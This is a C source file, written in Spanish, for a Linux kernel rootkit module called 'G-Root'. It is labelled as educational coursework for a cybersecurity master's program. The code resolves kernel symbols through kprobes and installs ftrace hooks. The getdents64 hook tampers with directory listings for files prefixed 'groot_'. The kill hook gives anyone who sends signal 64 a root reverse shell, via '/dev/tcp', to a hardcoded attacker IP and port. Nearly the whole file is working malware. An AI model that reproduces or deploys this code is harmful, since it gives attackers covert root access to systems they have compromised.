/*
 * G-Root: Rootkit de kernel Linux para fines educativos
 * Tarea 3 - Principios de Seguridad en Sistemas Operativos
 * Maestría en Ciberseguridad - TEC
 *
 * Arquitectura: x86_64 / kernel 5.x+
 * Técnica: Ftrace hooking (compatible con kernels modernos)
 *
 * Autores: Sebastián Quesada Chaverri (2019065076)
 *          [Compañero 2], [Compañero 3]
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <asm/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sebastián Quesada, TEC Maestría Ciberseguridad");
MODULE_DESCRIPTION("G-Root: Rootkit educativo x86_64 via Ftrace");
MODULE_VERSION("1.0");

#define PREFIX        "groot_"
#define HIDDEN_NAME   "Oculto"
#define ATTACKER_IP   "192.168.1.100"
#define ATTACKER_PORT "4444"
#define SHELL_SIGNAL   64

/* ============================================================
 * RESOLUCIÓN DE SÍMBOLOS VIA KPROBES
 * ============================================================ */
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t g_kallsyms_lookup_name = NULL;

static int resolve_kallsyms(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("g-root: register_kprobe falló: %d\n", ret);
        return ret;
    }
    g_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    pr_info("g-root: kallsyms_lookup_name resuelto\n");
    return 0;
}

/* ============================================================
 * FTRACE HOOK INFRASTRUCTURE
 * ============================================================ */
struct ftrace_hook {
    const char     *name;
    void           *function;
    void           *original;
    unsigned long   address;
    struct ftrace_ops ops;
};

static int fh_resolve(struct ftrace_hook *hook)
{
    hook->address = g_kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("g-root: no se encontró símbolo: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *)hook->original) = hook->address;
    return 0;
}

static void notrace fh_thunk(unsigned long ip, unsigned long parent_ip,
                              struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

static int fh_install(struct ftrace_hook *hook)
{
    int err = fh_resolve(hook);
    if (err) return err;

    hook->ops.func  = fh_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_err("g-root: ftrace_set_filter_ip falló: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_err("g-root: register_ftrace_function falló: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    pr_info("g-root: hook instalado en %s\n", hook->name);
    return 0;
}

static void fh_remove(struct ftrace_hook *hook)
{
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

/* ============================================================
 * HOOK: getdents64
 * ============================================================ */
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent =
        (struct linux_dirent64 __user *) regs->si;
    long ret;
    struct linux_dirent64 *ker_buf, *cur;
    unsigned long offset = 0;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    ker_buf = kzalloc(ret, GFP_KERNEL);
    if (!ker_buf)
        return ret;

    if (copy_from_user(ker_buf, dirent, ret)) {
        kfree(ker_buf);
        return ret;
    }

    while (offset < ret) {
        cur = (void *)ker_buf + offset;
        if (cur->d_reclen == 0)
            break;

        if (strncmp(cur->d_name, PREFIX, strlen(PREFIX)) == 0) {
            pr_info("g-root: '%s' -> '%s'\n", cur->d_name, HIDDEN_NAME);
            memset(cur->d_name, 0, strlen(cur->d_name));
            strncpy(cur->d_name, HIDDEN_NAME, NAME_MAX);
        }

        offset += cur->d_reclen;
    }

    if (copy_to_user(dirent, ker_buf, ret))
        pr_warn("g-root: copy_to_user falló\n");

    kfree(ker_buf);
    return ret;
}

/* ============================================================
 * HOOK: kill — reverse shell con señal 64
 * ============================================================ */
static asmlinkage long (*orig_kill)(const struct pt_regs *regs);

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = (int) regs->si;

    if (sig == SHELL_SIGNAL) {
        static char cmd[128];
        char *argv[] = { "/bin/bash", "-c", cmd, NULL };
        char *envp[] = {
            "HOME=/root",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
            NULL
        };
        snprintf(cmd, sizeof(cmd),
                 "bash -i >& /dev/tcp/%s/%s 0>&1",
                 ATTACKER_IP, ATTACKER_PORT);
        pr_info("g-root: señal %d -> reverse shell\n", sig);
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        return 0;
    }

    return orig_kill(regs);
}

/* ============================================================
 * REGISTRO DE HOOKS
 * ============================================================ */
static struct ftrace_hook hooks[] = {
    { "__x64_sys_getdents64", hook_getdents64, &orig_getdents64 },
    { "__x64_sys_kill",       hook_kill,       &orig_kill       },
};

/* ============================================================
 * INIT / EXIT
 * ============================================================ */
static int __init rootkit_init(void)
{
    int ret, i;

    ret = resolve_kallsyms();
    if (ret) return ret;

    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        ret = fh_install(&hooks[i]);
        if (ret) {
            while (--i >= 0)
                fh_remove(&hooks[i]);
            return ret;
        }
    }

    pr_info("g-root: modulo cargado\n");
    pr_info("g-root: prefijo '%s' -> '%s'\n", PREFIX, HIDDEN_NAME);
    pr_info("g-root: kill -%d <pid> activa reverse shell\n", SHELL_SIGNAL);
    return 0;
}

static void __exit rootkit_exit(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(hooks); i++)
        fh_remove(&hooks[i]);
    pr_info("g-root: modulo descargado\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
